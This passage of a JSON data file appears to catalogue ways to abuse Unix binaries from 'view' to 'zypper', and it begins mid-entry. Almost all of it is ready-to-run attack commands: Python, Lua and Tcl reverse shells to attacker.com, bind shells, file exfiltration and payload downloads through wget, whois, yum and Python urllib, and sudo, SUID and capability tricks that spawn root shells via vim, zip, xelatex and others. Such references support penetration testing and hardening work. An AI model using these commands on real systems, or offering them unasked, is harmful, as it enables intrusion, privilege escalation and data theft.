                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")",
                "vim.command(\":q!\")'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "view -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  while true do",
                "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));t:send(b);",
                "  end;",
                "  f:close();t:close();'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "view -c ':lua local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  while true do",
                "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));c:send(b);",
                "  end;c:close();f:close();'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "view -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))",
                "vim.command(\":q!\")'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "view -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])",
                "vim.command(\":q!\")'"
            ]
        },
        "File write": {
            "code": [
                "view file_to_write",
                "iDATA",
                "^[",
                "w!"
            ]
        },
        "File read": {
            "code": [
                "view file_to_read"
            ]
        },
        "Library load": {
            "code": [
                "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which view) .",
                "",
                "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo view -c ':!/bin/sh'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which view) .",
                "sudo setcap cap_setuid+ep view",
                "",
                "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which view) .",
                "",
                "./view -c ':lua os.execute(\"reset; exec sh\")'"
            ]
        }
    },
    "vigr": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which vigr) .",
                "",
                "./vigr"
            ]
        },
        "Sudo": {
            "code": [
                "sudo vigr"
            ]
        }
    },
    "vim": {
        "Shell": {
            "code": [
                "vim -c ':!/bin/sh'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")",
                "vim.command(\":q!\")'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "vim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  while true do",
                "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));t:send(b);",
                "  end;",
                "  f:close();t:close();'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "vim -c ':lua local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  while true do",
                "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));c:send(b);",
                "  end;c:close();f:close();'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "vim -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))",
                "vim.command(\":q!\")'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "vim -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])",
                "vim.command(\":q!\")'"
            ]
        },
        "File write": {
            "code": [
                "vim file_to_write",
                "iDATA",
                "^[",
                "w"
            ]
        },
        "File read": {
            "code": [
                "vim file_to_read"
            ]
        },
        "Library load": {
            "code": [
                "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which vim) .",
                "",
                "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo vim -c ':!/bin/sh'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which vim) .",
                "sudo setcap cap_setuid+ep vim",
                "",
                "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which vim) .",
                "",
                "./vim -c ':lua os.execute(\"reset; exec sh\")'"
            ]
        }
    },
    "vimdiff": {
        "Shell": {
            "code": [
                "vimdiff -c ':!/bin/sh'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")",
                "vim.command(\":q!\")'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "vimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  while true do",
                "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));t:send(b);",
                "  end;",
                "  f:close();t:close();'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "vimdiff -c ':lua local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  while true do",
                "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));c:send(b);",
                "  end;c:close();f:close();'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "vimdiff -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))",
                "vim.command(\":q!\")'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "vimdiff -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])",
                "vim.command(\":q!\")'"
            ]
        },
        "File write": {
            "code": [
                "vimdiff file_to_write",
                "iDATA",
                "^[",
                "w"
            ]
        },
        "File read": {
            "code": [
                "vimdiff file_to_read"
            ]
        },
        "Library load": {
            "code": [
                "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which vimdiff) .",
                "",
                "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo vimdiff -c ':!/bin/sh'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which vimdiff) .",
                "sudo setcap cap_setuid+ep vimdiff",
                "",
                "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which vimdiff) .",
                "",
                "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
            ]
        }
    },
    "vipw": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which vipw) .",
                "",
                "./vipw"
            ]
        },
        "Sudo": {
            "code": [
                "sudo vipw"
            ]
        }
    },
    "virsh": {
        "File write": {
            "code": [
                "LFILE_DIR=/root",
                "LFILE_NAME=file_to_write",
                "",
                "echo 'data' > data_to_write",
                "",
                "TF=$(mktemp)",
                "cat > $TF <<EOF",
                "<volume type='file'>",
                "  <name>y</name>",
                "  <key>$LFILE_DIR/$LFILE_NAME</key>",
                "  <source>",
                "  </source>",
                "  <capacity unit='bytes'>5</capacity>",
                "  <allocation unit='bytes'>4096</allocation>",
                "  <physical unit='bytes'>5</physical>",
                "  <target>",
                "    <path>$LFILE_DIR/$LFILE_NAME</path>",
                "    <format type='raw'/>",
                "    <permissions>",
                "      <mode>0600</mode>",
                "      <owner>0</owner>",
                "      <group>0</group>",
                "    </permissions>",
                "  </target>",
                "</volume>",
                "EOF",
                "",
                "virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR",
                "virsh -c qemu:///system vol-create --pool x --file $TF",
                "virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write",
                "virsh -c qemu:///system pool-destroy x"
            ]
        },
        "File read": {
            "code": [
                "LFILE_DIR=/root",
                "LFILE_NAME=file_to_read",
                "",
                "SPATH=file_to_save",
                "",
                "virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR",
                "virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH",
                "virsh -c qemu:///system pool-destroy x"
            ]
        },
        "Sudo": {
            "code": [
                "SCRIPT=script_to_run",
                "TF=$(mktemp)",
                "cat > $TF << EOF",
                "<domain type='kvm'>",
                "  <name>x</name>",
                "  <os>",
                "    <type arch='x86_64'>hvm</type>",
                "  </os>",
                "  <memory unit='KiB'>1</memory>",
                "  <devices>",
                "    <interface type='ethernet'>",
                "      <script path='$SCRIPT'/>",
                "    </interface>",
                "  </devices>",
                "</domain>",
                "EOF",
                "sudo virsh -c qemu:///system create $TF",
                "virsh -c qemu:///system destroy x"
            ]
        }
    },
    "volatility": {
        "Shell": {
            "code": [
                "volatility -f file.dump volshell",
                "__import__('os').system('/bin/sh')"
            ]
        }
    },
    "wall": {
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo wall --nobanner \"$LFILE\""
            ]
        }
    },
    "watch": {
        "Shell": {
            "code": [
                "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which watch) .",
                "",
                "./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which watch) .",
                "",
                "./watch 'reset; exec sh 1>&0 2>&0'"
            ]
        }
    },
    "wc": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "wc --files0-from \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which wc) .",
                "",
                "LFILE=file_to_read",
                "./wc --files0-from \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo wc --files0-from \"$LFILE\""
            ]
        }
    },
    "wget": {
        "File upload": {
            "code": [
                "URL=http://attacker.com/",
                "LFILE=file_to_send",
                "wget --post-file=$LFILE $URL"
            ]
        },
        "File download": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "wget $URL -O $LFILE"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo DATA > $TF",
                "wget -i $TF -o $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "wget -i $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which wget) .",
                "",
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "./wget $URL -O $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "sudo wget $URL -O $LFILE"
            ]
        }
    },
    "whiptail": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "whiptail --textbox --scrolltext \"$LFILE\" 0 0"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which whiptail) .",
                "",
                "LFILE=file_to_read",
                "./whiptail --textbox --scrolltext \"$LFILE\" 0 0"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo whiptail --textbox --scrolltext \"$LFILE\" 0 0"
            ]
        }
    },
    "whois": {
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_send",
                "whois -h $RHOST -p $RPORT \"`cat $LFILE`\""
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_save",
                "whois -h $RHOST -p $RPORT > \"$LFILE\""
            ]
        }
    },
    "wireshark": {
        "Sudo": {
            "code": [
                "PORT=4444",
                "sudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &",
                "echo 'DATA' | nc -u 127.127.127.127 \"$PORT\""
            ]
        }
    },
    "wish": {
        "Shell": {
            "code": [
                "wish",
                "exec /bin/sh <@stdin >@stdout 2>@stderr"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
            ]
        },
        "Sudo": {
            "code": [
                "sudo wish",
                "exec /bin/sh <@stdin >@stdout 2>@stderr"
            ]
        }
    },
    "xargs": {
        "Shell": {
            "code": [
                "xargs -a /dev/null sh"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "xargs -a \"$LFILE\" -0"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which xargs) .",
                "",
                "./xargs -a /dev/null sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo xargs -a /dev/null sh"
            ]
        }
    },
    "xelatex": {
        "Shell": {
            "code": [
                "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
            ]
        },
        "File read": {
            "code": [
                "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
                "strings article.dvi"
            ]
        },
        "Sudo": {
            "code": [
                "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
                "strings article.dvi"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which xelatex) .",
                "",
                "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
            ]
        }
    },
    "xetex": {
        "Shell": {
            "code": [
                "xetex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which xetex) .",
                "",
                "./xetex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        }
    },
    "xmodmap": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "xmodmap -v $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which xmodmap) .",
                "",
                "LFILE=file_to_read",
                "./xmodmap -v $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo xmodmap -v $LFILE"
            ]
        }
    },
    "xmore": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "xmore $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which xmore) .",
                "",
                "LFILE=file_to_read",
                "./xmore $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo xmore $LFILE"
            ]
        }
    },
    "xpad": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "xpad -f \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo xpad -f \"$LFILE\""
            ]
        }
    },
    "xxd": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "echo DATA | xxd | xxd -r - \"$LFILE\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "xxd \"$LFILE\" | xxd -r"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which xxd) .",
                "",
                "LFILE=file_to_read",
                "./xxd \"$LFILE\" | xxd -r"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo xxd \"$LFILE\" | xxd -r"
            ]
        }
    },
    "xz": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "xz -c \"$LFILE\" | xz -d"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which xz) .",
                "",
                "LFILE=file_to_read",
                "./xz -c \"$LFILE\" | xz -d"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo xz -c \"$LFILE\" | xz -d"
            ]
        }
    },
    "yarn": {
        "Shell": {
            "code": [
                "yarn exec /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo yarn exec /bin/sh"
            ]
        }
    },
    "yelp": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "yelp \"man:$LFILE\""
            ]
        }
    },
    "yum": {
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "RFILE=file_to_get.rpm",
                "yum install http://$RHOST/$RFILE"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'id' > $TF/x.sh",
                "fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF",
                ""
            ]
        }
    },
    "zip": {
        "Shell": {
            "code": [
                "TF=$(mktemp -u)",
                "zip $TF /etc/hosts -T -TT 'sh #'",
                "rm $TF"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file-to-read",
                "TF=$(mktemp -u)",
                "zip $TF $LFILE",
                "unzip -p $TF"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -u)",
                "sudo zip $TF /etc/hosts -T -TT 'sh #'",
                "sudo rm $TF"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which zip) .",
                "",
                "TF=$(mktemp -u)",
                "./zip $TF /etc/hosts -T -TT 'sh #'",
                "sudo rm $TF"
            ]
        }
    },
    "zsh": {
        "Shell": {
            "code": [
                "zsh"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "zsh -c 'echo DATA >$LFILE'"
            ]
        },
        "File read": {
            "code": [
                "export LFILE=file_to_read",
                "zsh -c 'echo \"$(<$LFILE)\"'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which zsh) .",
                "",
                "./zsh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo zsh"
            ]
        }
    },
    "zsoelim": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "zsoelim \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which zsoelim) .",
                "",
                "LFILE=file_to_read",
                "./zsoelim \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo zsoelim \"$LFILE\""
            ]
        }
    },
    "zypper": {
        "Shell": {
            "code": [
                "zypper x"
            ]
        },
        "Sudo": {
            "code": [
                "sudo zypper x"
            ]
        }
    }
}